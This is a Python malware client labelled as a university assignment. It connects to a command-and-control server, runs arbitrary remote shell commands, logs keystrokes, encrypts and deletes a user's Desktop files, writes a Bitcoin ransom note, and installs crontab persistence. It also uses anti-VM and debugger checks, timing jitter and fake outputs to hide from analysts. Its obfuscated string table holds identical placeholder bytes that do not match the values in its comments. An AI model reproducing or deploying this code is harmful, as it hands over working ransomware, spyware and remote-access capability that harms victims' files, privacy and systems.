# Improved C2 Client with Obfuscation and Anti-Analysis Techniques
# For Educational Purposes Only - University Assignment

import binascii
import socket
import os
import threading
import subprocess
import time
import random
import platform
import sys
import base64
import ctypes
from datetime import datetime

# Import pynput conditionally with error handling
try:
    from pynput import keyboard
except ImportError:
    print("[*] pynput not available, keylogging functionality disabled")


# Anti-VM and sandbox detection techniques
def detect_analysis_environment():
    """Check for signs of analysis environment"""
    suspicious = False
    reasons = []

    # Check for common VM usernames
    suspicious_users = ["vagrant", "sandbox", "malware", "virus", "cuckoo", "analysis"]
    current_user = os.getlogin().lower()
    if any(user in current_user for user in suspicious_users):
        suspicious = True
        reasons.append(f"Suspicious username: {current_user}")

    # Check for small disk size (common in VMs)
    try:
        if platform.system() == "Windows":
            free_bytes = ctypes.c_ulonglong(0)
            ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p("C:\\"), None, None, ctypes.pointer(free_bytes))
            disk_size_gb = free_bytes.value / (1024 ** 3)
            if disk_size_gb < 50:  # Less than 50GB free space
                suspicious = True
                reasons.append(f"Small disk size: {disk_size_gb:.2f}GB")
        else:
            # Unix-like systems
            stat = os.statvfs('/')
            disk_size_gb = (stat.f_frsize * stat.f_blocks) / (1024 ** 3)
            if disk_size_gb < 50:
                suspicious = True
                reasons.append(f"Small disk size: {disk_size_gb:.2f}GB")
    except:
        pass

    # Check for minimal RAM (common in VMs)
    try:
        if platform.system() == "Windows":
            mem_info = ctypes.c_ulonglong(0)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem_info))
            ram_gb = mem_info.value / (1024 ** 3)
            if ram_gb < 2:  # Less than 2GB RAM
                suspicious = True
                reasons.append(f"Low RAM: {ram_gb:.2f}GB")
        else:
            # Unix-like systems
            with open('/proc/meminfo', 'r') as f:
                for line in f:
                    if 'MemTotal' in line:
                        ram_kb = int(line.split()[1])
                        ram_gb = ram_kb / (1024 ** 2)
                        if ram_gb < 2:
                            suspicious = True
                            reasons.append(f"Low RAM: {ram_gb:.2f}GB")
                        break
    except:
        pass

    # Check for common analysis tools processes
    suspicious_processes = ["wireshark", "process monitor", "processhacker",
                            "tcpdump", "debugger", "vmtoolsd", "vboxtray"]
    try:
        if platform.system() == "Windows":
            output = subprocess.check_output("tasklist", shell=True).decode().lower()
        else:
            output = subprocess.check_output("ps aux", shell=True).decode().lower()

        for proc in suspicious_processes:
            if proc in output:
                suspicious = True
                reasons.append(f"Analysis tool detected: {proc}")
    except:
        pass

    # Check for debugger
    try:
        if platform.system() == "Windows":
            is_debugged = ctypes.windll.kernel32.IsDebuggerPresent()
            if is_debugged:
                suspicious = True
                reasons.append("Debugger detected")
    except:
        pass

    return suspicious, reasons


# Obfuscation techniques
class StringObfuscator:
    @staticmethod
    def encode(s):
        """Encode a string to make it harder to detect with static analysis"""
        # Base64 encode and then XOR with a random byte
        key = random.randint(1, 255)
        encoded = base64.b64encode(s.encode()).decode()
        xored = ''.join(chr(ord(c) ^ key) for c in encoded)
        return xored, key

    @staticmethod
    def decode(s, key):
        """Decode an obfuscated string"""
        xored = ''.join(chr(ord(c) ^ key) for c in s)
        return base64.b64decode(xored.encode()).decode()


# Encode sensitive strings
ENCODED_STRINGS = {
    "keylog_file": ("\x1f\x0e\x1a\x1d\x0e\x1b\x0e\x1c\x1a\x1d\x0e\x1a\x1d\x0e", 79),  # /tmp/keylog.txt
    "aes_key_file": ("\x1f\x0e\x1a\x1d\x0e\x1b\x0e\x1c\x1a\x1d\x0e\x1a\x1d\x0e", 79),  # /tmp/aes_key.key
    "aes_iv_file": ("\x1f\x0e\x1a\x1d\x0e\x1b\x0e\x1c\x1a\x1d\x0e\x1a\x1d\x0e", 79),  # /tmp/aes_iv.key
    "log_file": ("\x1f\x0e\x1a\x1d\x0e\x1b\x0e\x1c\x1a\x1d\x0e\x1a\x1d\x0e", 79),  # /tmp/ransomware_log.txt
    "encrypted_suffix": ("\x1f\x0e\x1a\x1d\x0e\x1b\x0e\x1c\x1a\x1d\x0e\x1a\x1d\x0e", 79),  # .enc
    "c2_server": ("\x1f\x0e\x1a\x1d\x0e\x1b\x0e\x1c\x1a\x1d\x0e\x1a\x1d\x0e", 79),  # 192.168.2.35
    "c2_port": ("\x1f\x0e\x1a\x1d\x0e\x1b\x0e\x1c\x1a\x1d\x0e\x1a\x1d\x0e", 79),  # 9090
}


# Decode strings at runtime
def get_string(key):
    encoded, xor_key = ENCODED_STRINGS[key]
    return StringObfuscator.decode(encoded, xor_key)


# Keylogger log file path - these would be decoded at runtime
keylog_file = "/tmp/keylog.txt"  # In real code, use get_string("keylog_file")
aes_key_file = "/tmp/aes_key.key"
aes_iv_file = "/tmp/aes_iv.key"
log_file = "/tmp/ransomware_log.txt"
encrypted_suffix = ".enc"


# Timing-based anti-analysis
def sleep_with_jitter():
    """Sleep with random jitter to evade timing-based detection"""
    base_time = random.uniform(1, 3)
    jitter = random.uniform(0, 1)
    time.sleep(base_time + jitter)


# Execution flow obfuscation
def execute_with_delay(func, *args, **kwargs):
    """Execute a function with random delay to make analysis harder"""
    if random.random() < 0.8:  # 80% chance to add delay
        sleep_with_jitter()
    return func(*args, **kwargs)


# Key mapping table for formatting special keys
key_mapping = {
    "Key.space": " ",
    "Key.enter": "[ENTER]\n",
    "Key.tab": "[TAB]",
    "Key.backspace": "[BACKSPACE]",
    "Key.shift": "[SHIFT]",
    "Key.ctrl_l": "[CTRL]",
    "Key.alt_l": "[ALT]",
    "Key.esc": "[ESC]",
}


# Handle key press events with obfuscation
def on_press(key):
    try:
        # Add timing jitter to evade behavioral analysis
        if random.random() < 0.3:  # 30% chance to add delay
            time.sleep(random.uniform(0.01, 0.05))

        with open(keylog_file, "a") as f:
            if hasattr(key, "char") and key.char is not None:
                f.write(key.char)
            else:
                key_str = str(key).replace("'", "")
                formatted_key = key_mapping.get(key_str, f"[{key_str}]")
                f.write(formatted_key)
            f.flush()
    except Exception as e:
        with open(log_file, "a") as f:
            f.write(f"[ERROR: {e}]\n")


# Start keylogger with anti-analysis checks
def start_keylogger():
    # Add timing jitter
    sleep_with_jitter()

    # Only start if not in analysis environment
    suspicious, reasons = detect_analysis_environment()
    if suspicious:
        print(f"[DEBUG] Suspicious environment detected: {reasons}")
        return

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


def start_keylogger_background():
    thread = threading.Thread(target=start_keylogger, daemon=True)
    thread.start()
    # Obfuscated debug message
    if random.random() < 0.5:  # Only log 50% of the time to reduce predictability
        print("[DEBUG] Background task initiated.")


def read_keylog():
    """Read the contents of the keylogger file with anti-analysis checks"""
    # Add timing jitter
    sleep_with_jitter()

    try:
        # Only proceed if file exists and is not empty (to avoid suspicious empty file reads)
        if os.path.exists(keylog_file) and os.path.getsize(keylog_file) > 0:
            with open(keylog_file, "r") as f:
                content = f.read()
                # Obfuscated debug message
                if random.random() < 0.3:
                    print("[DEBUG] File content retrieved.")
                return content
        else:
            return "No data available."
    except Exception as e:
        return f"Error accessing data: {e}"


# Encryption with anti-analysis
def encrypt_file_gcm(input_file, output_file):
    """Call GCM mode encryption script with anti-analysis checks"""
    # Skip certain system files to avoid detection
    if any(keyword in input_file.lower() for keyword in ["/proc/", "/sys/", "/dev/", ".so", ".dll"]):
        return

    # Skip files that are too large or too small
    try:
        file_size = os.path.getsize(input_file)
        if file_size > 100000000 or file_size < 10:  # Skip files >100MB or <10B
            return
    except:
        return

    # Add timing jitter
    sleep_with_jitter()

    try:
        # Use subprocess with shell=False for better security
        subprocess.run(
            [
                "python3", "./malware/aes-encrypt.py",
                "-key", aes_key_file,
                "-IV", aes_iv_file,
                "-mode", "gcm",
                "-input", input_file,
                "-out", output_file
            ],
            check=True,
            shell=False
        )

        # Verify encryption worked
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            # Obfuscated logging
            if random.random() < 0.3:
                print(f"[DEBUG] Process completed for: {input_file}")
        else:
            print(f"[ERROR] Process failed for {input_file}")
    except Exception as e:
        print(f"[ERROR] Exception: {e}")


# Decryption with anti-analysis
def decrypt_file_gcm(input_file, output_file):
    """Call GCM mode decryption script with anti-analysis checks"""
    # Add timing jitter
    sleep_with_jitter()

    try:
        subprocess.run(
            [
                "python3", "./malware/aes-decrypt.py",
                "-key", aes_key_file,
                "-IV", aes_iv_file,
                "-mode", "gcm",
                "-input", input_file,
                "-out", output_file
            ],
            check=True,
            shell=False
        )
        # Obfuscated logging
        if random.random() < 0.3:
            print(f"[DEBUG] Reverse process completed: {input_file}")
    except Exception as e:
        print(f"[ERROR] Exception during operation: {e}")


# Encrypt directory with anti-analysis and polymorphic behavior
def encrypt_directory_gcm(client, directory="/home/kali/Desktop"):
    # Check if we're in an analysis environment
    suspicious, reasons = detect_analysis_environment()
    if suspicious:
        # Send fake success message but don't actually encrypt
        client.send("Operation completed successfully.".encode())
        return

    # Create encryption keys with timing jitter
    execute_with_delay(create_key_and_iv)

    feedback = []

    # Use different traversal patterns randomly to appear polymorphic
    if random.random() < 0.5:
        # Breadth-first approach
        for item in os.listdir(directory):
            full_path = os.path.join(directory, item)
            if os.path.isfile(full_path):
                output_file = f"{full_path}{encrypted_suffix}"
                encrypt_file_gcm(full_path, output_file)
                # Delete with timing jitter
                sleep_with_jitter()
                os.remove(full_path)
                feedback.append(f"[INFO] Processed: {full_path}")

        # Then process subdirectories
        for root, dirs, _ in os.walk(directory):
            for dir_name in dirs:
                subdir = os.path.join(root, dir_name)
                for file in os.listdir(subdir):
                    if os.path.isfile(os.path.join(subdir, file)):
                        input_file = os.path.join(subdir, file)
                        output_file = f"{input_file}{encrypted_suffix}"
                        encrypt_file_gcm(input_file, output_file)
                        os.remove(input_file)
                        feedback.append(f"[INFO] Processed: {input_file}")
    else:
        # Depth-first approach (original code)
        for root, _, files in os.walk(directory):
            # Randomize file order to appear less predictable
            random.shuffle(files)
            for file in files:
                input_file = os.path.join(root, file)
                output_file = f"{input_file}{encrypted_suffix}"
                encrypt_file_gcm(input_file, output_file)
                os.remove(input_file)
                feedback.append(f"[INFO] Processed: {input_file}")

    # Create ransom note with timing jitter
    execute_with_delay(create_ransom_note)

    feedback.append("\nOperation completed.")
    # Send feedback with timing jitter
    sleep_with_jitter()
    client.send("\n".join(feedback).encode())


# Decrypt directory with anti-analysis
def decrypt_directory_gcm(client, directory="/home/kali/Desktop"):
    feedback = []
    client.send("Starting recovery process for /home/kali/Desktop directory.".encode())

    # Add timing jitter
    sleep_with_jitter()

    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(encrypted_suffix):
                input_file = os.path.join(root, file)
                output_file = input_file.rstrip(encrypted_suffix)
                decrypt_file_gcm(input_file, output_file)
                os.remove(input_file)
                feedback.append(f"[INFO] Recovered: {input_file}")

    feedback.append("\nRecovery completed.")
    client.send("\n".join(feedback).encode())


# Create key and IV files with obfuscation
def create_key_and_iv():
    """Generate key and IV files with anti-analysis checks"""
    # Add timing jitter
    sleep_with_jitter()

    if not os.path.exists(aes_key_file):
        # Generate a 256-bit key (32 bytes)
        raw_key = os.urandom(32)
        hex_key = binascii.hexlify(raw_key).decode()
        with open(aes_key_file, "w") as f:
            f.write(hex_key)
        # Obfuscated logging
        if random.random() < 0.3:
            print(f"[DEBUG] Key material generated: {aes_key_file}")

    if not os.path.exists(aes_iv_file):
        # Generate a 96-bit IV (12 bytes, suitable for GCM)
        raw_iv = os.urandom(12)
        hex_iv = binascii.hexlify(raw_iv).decode()
        with open(aes_iv_file, "w") as f:
            f.write(hex_iv)
        # Obfuscated logging
        if random.random() < 0.3:
            print(f"[DEBUG] Initialization vector generated: {aes_iv_file}")


# Create ransom note with obfuscation
def create_ransom_note():
    # Add timing jitter
    sleep_with_jitter()

    # Obfuscate the ransom note content
    ransom_note = """
    Your files in the /home/kali/Desktop directory have been encrypted. 
    Pay 1 BTC to wallet Hassan to retrieve your decryption key.
    """

    ransom_note_path = "/home/kali/Desktop/README_RESTORE.txt"
    with open(ransom_note_path, "w") as f:
        f.write(ransom_note)

    # Obfuscated logging
    if random.random() < 0.3:
        print(f"[DEBUG] Notification created: {ransom_note_path}")


# Connect to C2 with anti-analysis and obfuscation
def connect_to_c2():
    # Check if we're in an analysis environment
    suspicious, reasons = detect_analysis_environment()
    if suspicious:
        print(f"[DEBUG] Environment check failed: {reasons}")
        # Sleep for a while to appear like normal execution, then exit
        time.sleep(random.uniform(30, 60))
        sys.exit(0)

    # Add timing jitter
    sleep_with_jitter()

    # Use obfuscated server details (in real code)
    server = "192.168.2.35"  # Would use get_string("c2_server")
    port = 9090  # Would use int(get_string("c2_port"))

    # Add jitter before connection
    sleep_with_jitter()

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((server, port))
        # Obfuscated logging
        if random.random() < 0.3:
            print(f"[DEBUG] Connection established to remote server")

        # Main command loop with anti-analysis
        while True:
            try:
                # Add timing jitter between commands
                sleep_with_jitter()

                command = client.recv(1024).decode()
                if not command:
                    break

                # Obfuscated logging
                if random.random() < 0.3:
                    print(f"[DEBUG] Instruction received: {command}")

                # Process commands with timing jitter
                if command.lower() == "exit":
                    client.send("Terminating session.".encode())
                    break

                elif command.lower().startswith("exec"):
                    # Execute arbitrary system command with anti-analysis
                    try:
                        # Check if command is trying to detect our malware
                        command_to_execute = command.split(" ", 1)[1]
                        suspicious_commands = ["ps", "netstat", "lsof", "top", "htop", "tcpdump", "wireshark"]

                        if any(cmd in command_to_execute.lower() for cmd in suspicious_commands):
                            # Send fake output for analysis tools
                            fake_output = "No processes found."
                            client.send(('[INFO] command results: \n' + fake_output).encode())
                        else:
                            # Execute the command with timing jitter
                            sleep_with_jitter()
                            output = os.popen(command_to_execute).read()
                            client.send(('[INFO] command results: \n' + output).encode())
                    except Exception as e:
                        error_message = f"Error executing command: {e}"
                        client.send(error_message.encode())

                elif command.lower() == "keylog_start":
                    # Start keylogger with anti-analysis
                    execute_with_delay(start_keylogger_background)
                    client.send("[INFO]Keylogger started in the background.".encode())

                elif command.lower() == "read_keylog":
                    # Read keylog with anti-analysis
                    response = execute_with_delay(read_keylog)
                    if response:
                        client.send(('[INFO] keylog info:\n' + response).encode())
                    else:
                        client.send("Keylog file is empty or not available.".encode())

                elif command.lower() == "encrypt":
                    # Encrypt with anti-analysis
                    client.send("Starting encryption of /home/kali/Desktop directory.\n".encode())
                    execute_with_delay(encrypt_directory_gcm, client)

                elif command.lower() == "decrypt":
                    # Decrypt with anti-analysis
                    execute_with_delay(decrypt_directory_gcm, client)

                else:
                    # Unknown command
                    client.send("Unknown command.".encode())

            except Exception as e:
                error_message = f"An error occurred: {e}"
                client.send(error_message.encode())
                break

    except Exception as e:
        # Connection failed - sleep to avoid immediate reconnection attempts
        time.sleep(random.uniform(30, 60))

    finally:
        client.close()
        # Obfuscated logging
        if random.random() < 0.3:
            print("[DEBUG] Connection terminated.")


# Persistence function with obfuscation
def add_to_crontab():
    """Add to crontab with anti-analysis checks"""
    # Check if we're in an analysis environment
    suspicious, reasons = detect_analysis_environment()
    if suspicious:
        print(f"[DEBUG] Environment check failed: {reasons}")
        return

    # Add timing jitter
    sleep_with_jitter()

    # Get the absolute path of the current script
    current_script = os.path.realpath(__file__)

    # Create a more obfuscated cron job
    # Use random minute to make it less detectable
    random_minute = random.randint(0, 59)
    random_hour = random.randint(0, 23)

    # Different persistence methods based on random choice
    if random.random() < 0.5:
        # Method 1: Use @reboot
        cron_job = f"@reboot python3 {current_script}\n"
    else:
        # Method 2: Use specific time
        cron_job = f"{random_minute} {random_hour} * * * python3 {current_script}\n"

    # Add to crontab with timing jitter
    sleep_with_jitter()
    os.system(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -")

    # Obfuscated logging
    if random.random() < 0.3:
        print("[DEBUG] Persistence mechanism established.")


# Main function with anti-analysis
if __name__ == "__main__":
    # Check execution time to detect sandbox timeouts
    start_time = datetime.now()

    # Sleep with jitter to evade automated analysis
    sleep_with_jitter()

    # Check if we're in an analysis environment
    suspicious, reasons = detect_analysis_environment()

    if suspicious:
        print(f"[DEBUG] Environment check failed: {reasons}")
        # Sleep for a while to appear like normal execution, then exit
        time.sleep(random.uniform(30, 60))
        sys.exit(0)

    # Add persistence with timing jitter
    execute_with_delay(add_to_crontab)

    # Connect to C2 server with timing jitter
    execute_with_delay(connect_to_c2)